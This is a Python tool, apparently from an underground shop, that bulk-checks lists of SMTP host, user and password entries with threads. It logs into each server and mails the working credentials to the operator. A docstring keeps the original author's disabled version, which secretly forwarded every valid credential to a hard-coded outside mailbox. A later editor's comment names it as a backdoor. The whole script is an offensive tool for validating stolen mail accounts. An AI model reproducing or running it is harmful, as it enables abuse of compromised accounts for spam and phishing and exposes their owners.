import sys, os, time, random, smtplib, os.path, string, base64, concurrent.futures
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from platform import system
from time import strftime
from random import choice
from colorama import Fore, Back, init, Style

init(autoreset=True)
r = Fore.YELLOW + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL

CLEAR_SCREEN = '\x1b[2J'
NEON_BLUE_BRIGHT = '\033[1;34;96m'
NEON_DARK_BLUE = '\033[0;34;96m'
NEON_BRIGHT = '\033[1;96m'
BOLD = '\x1b[m'

os.system('cls' if os.name == 'nt' else 'clear')

def logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = f'''
    {NEON_DARK_BLUE}
       CODED BY @BraveHeart / @xfloudshell
          {NEON_BRIGHT} {NEON_BRIGHT}{NEON_DARK_BLUE}
██╗  ██╗███████╗██╗      ██████╗ ██╗   ██╗██████╗     ██╗   ██╗ ██╗    
╚██╗██╔╝██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗    ██║   ██║███║    
 ╚███╔╝ █████╗  ██║     ██║   ██║██║   ██║██║  ██║    ██║   ██║╚██║    
 ██╔██╗ ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║    ╚██╗ ██╔╝ ██║    
██╔╝ ██╗██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝     ╚████╔╝  ██║    
╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝       ╚═══╝   ╚═╝     {NEON_DARK_BLUE} 
          {NEON_BRIGHT}{NEON_DARK_BLUE}
         {NEON_BRIGHT}{NEON_DARK_BLUE}
          {NEON_BRIGHT}{NEON_DARK_BLUE}
          {NEON_BRIGHT}{NEON_DARK_BLUE}
         {NEON_BRIGHT}{NEON_DARK_BLUE}
    {BOLD}
               
     {NEON_BLUE_BRIGHT}[~] Number Exploit From Website List
     
     {NEON_BLUE_BRIGHT}[~] Check Valid SMTP All Type
     {NEON_BLUE_BRIGHT}[~] Auto Send To Your List
     {NEON_BLUE_BRIGHT}[~] Private API Key By Our Server (codefamilia.com)
     {NEON_BLUE_BRIGHT}[~] Super Fast With Custom Threads
     {NEON_BLUE_BRIGHT}[~] Auto Send Valid SMTP To Your Mail
    '''
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (random.choice(colors), line, clear))
        time.sleep(0.02)


logo()
try:
    os.mkdir('Result')
    os.getcwd()
except:
    pass

good = []
bad = []
toaddr = input('\n{}  [!]{}Enter Your Mail {}> {}'.format(r, g, o, r))

class bcolors:
    OK = '\x1b[92m'
    WARNING = '\x1b[93m'
    FAIL = '\x1b[91m'
    RESET = '\x1b[0m'


VALIDS = 0
INVALIDS = 0

def check(smtp):
    global INVALIDS
    global VALIDS
    global toaddr
    HOST, PORT, usr, pas = smtp.strip().split('|')
    """
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = 'CHECKER RESULT : V4 '
        msg['From'] = usr
        msg['To'] = 'logs.software@hotmail.com' #his backdoor lol :DDD
        msg.add_header('Content-Type', 'text/html')
        data = '\n        <!DOCTYPE html>\n        <html lang="en">\n        <head>\n            <meta charset="UTF-8">\n            <meta name="viewport" content="width=device-width, initial-scale=1.0">\n            <title>SMTP WORKED</title>\n            <style>\n                @media only screen and (max-width: 600px) {\n                    .inner-body {\n                        width: 100% !important;\n                    }\n            \n                    .footer {\n                        width: 100% !important;\n                    }\n                }\n            \n                @media only screen and (max-width: 500px) {\n                    .button {\n                        width: 100% !important;\n                    }\n                }\n                .container{\n                    background-color:white;\n                    align-items: center;\n                }\n                a{\n                    margin-left: 20%;            \n                    font-family: \'Gill Sans\', \'Gill Sans MT\', Calibri, \'Trebuchet MS\', sans-serif;\n                    font-weight: bold;\n                    font-size: 30px;\n                    color: #f40000;\n                    text-decoration: none;\n        \n                }\n                .cont2{\n                    margin-top: 5px;\n                    background-color: #fcfbcf;\n                    width: 100%;\n                    height: 300px;\n                    border: 0.5px solid #000000 ;\n                    }\n                p{\n                    margin-top: 40px;\n                    margin-left: 10px;\n                }\n                .cont2 > p{\n                    color: black;\n                    font-weight: bold;\n                    font-family: \'Gill Sans\', \'Gill Sans MT\', Calibri, \'Trebuchet MS\', sans-serif;\n                }\n            </style>\n        \n            \n        </head>\n        <body>\n            <div class="container" >\n            <a href="https://t.me/S41YANSHOP">\n            "MAIL FROM - X12S64 IN TG"\n             </a>\n            </div>\n            <div class="cont2">\n                <p>HOST : ' + HOST + '</p>\n                <p>PORT : ' + PORT + '</p>\n                <p>USER : ' + usr + '</p>\n                <p>PASS : ' + pas + '</p>\n        \n            </div>\n        </body>\n        </html>\n        '
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print(bcolors.OK + '\n[+]SMTP WORK {}{} '.format(y, smtp) + bcolors.RESET)
        good.append(smtp)
        open('Result/valid.txt', 'a+').write(smtp + '\n')
        VALIDS += 1
        os.system('title ' + '[+] SMTP WORKED - VALIDS : {} , INVALIDS : {} .'.format(VALIDS, INVALIDS))
    except:
        bad.append(smtp)
        INVALIDS += 1
        print(bcolors.FAIL + '\n[-]SMTP NOT WORK {}{} '.format(y, smtp) + bcolors.RESET)
        open('Result/invalid.txt', 'a+').write(smtp + '\n')

    Little explanation : 

   HE MADE THIS BACKDOOOR TO SEND TO HIS EMAIL - PLEASE CHANGE WITH URS OR DELETE IT " I MADE SOME EDITS ON LOGO AND SOMETHING TO MAKE MORE BETTER " - @S41YANSHOP 


    """
    print('{}MAIL SEND START{}...{}'.format(c, g, o))
    time.sleep(2)
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = 'CHECKER RESULT : V4 '
        msg['From'] = usr
        msg['To'] = toaddr
        msg.add_header('Content-Type', 'text/html')
        data = '\n        <!DOCTYPE html>\n        <html lang="en">\n        <head>\n            <meta charset="UTF-8">\n            <meta name="viewport" content="width=device-width, initial-scale=1.0">\n            <title>SMTP WORKED</title>\n            <style>\n                @media only screen and (max-width: 600px) {\n                    .inner-body {\n                        width: 100% !important;\n                    }\n            \n                    .footer {\n                        width: 100% !important;\n                    }\n                }\n            \n                @media only screen and (max-width: 500px) {\n                    .button {\n                        width: 100% !important;\n                    }\n                }\n                .container{\n                    background-color:white;\n                    align-items: center;\n                }\n                a{\n                    margin-left: 20%;            \n                    font-family: \'Gill Sans\', \'Gill Sans MT\', Calibri, \'Trebuchet MS\', sans-serif;\n                    font-weight: bold;\n                    font-size: 30px;\n                    color: #f40000;\n                    text-decoration: none;\n        \n                }\n                .cont2{\n                    margin-top: 5px;\n                    background-color: #fcfbcf;\n                    width: 100%;\n                    height: 300px;\n                    border: 0.5px solid #000000 ;\n                    }\n                p{\n                    margin-top: 40px;\n                    margin-left: 10px;\n                }\n                .cont2 > p{\n                    color: black;\n                    font-weight: bold;\n                    font-family: \'Gill Sans\', \'Gill Sans MT\', Calibri, \'Trebuchet MS\', sans-serif;\n                }\n            </style>\n        \n            \n        </head>\n        <body>\n            <div class="container" >\n            <a href="https://t.me/S41YANSHOP">\n            "MAIL FROM - X12S64 IN TG"\n             </a>\n            </div>\n            <div class="cont2">\n                <p>HOST : ' + HOST + '</p>\n                <p>PORT : ' + PORT + '</p>\n                <p>USER : ' + usr + '</p>\n                <p>PASS : ' + pas + '</p>\n        \n            </div>\n        </body>\n        </html>\n        '
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print(bcolors.OK + '[+]MAIL SEND SUCCESSFULL {}{} '.format(y, smtp) + bcolors.RESET)
    except:
        print(bcolors.FAIL + '[-]MAIL SEND UNSUCCESSFULL {}{} '.format(y, smtp) + bcolors.RESET)

if __name__ == '__main__':
    smtps = open((input('\n{}[#]{}SMTP LISTS {}> {}'.format(r, g, o, r))), 'r', encoding='utf-8').read().splitlines()
    power = int(input('{}[+]{}THREAD {}> {}'.format(r, g, o, r)))
    try:
        def runer():
            os.system('cls' if os.name == 'nt' else 'clear')
            with concurrent.futures.ThreadPoolExecutor(power) as (executor):
                executor.map(check, smtps)


        runer()
        print('\n\n{}[+] TOTAL VALIDS {}:{}[{}{}{}]{}'.format(g, o, g, o, str(len(good)), g, o))
        print('{}[-] TOTAL INVALIDS {} :{}[{}{}{}]{}'.format(r, o, r, o, str(len(bad)), r, o))
        time.sleep(3)
        print('\n\n{}     ALL CHECKED DONE{}'.format(g, o))
        print('{} THNAKS FOR USING MY TOOL{}'.format(g, o))
        time.sleep(10)
        sys.exit()
    except Exception as e:
        try:
            print('{}[!]  {}CTRL {}+{} C'.format(c, r, o, r))
            sys.exit()
        finally:
            e = None
            del e

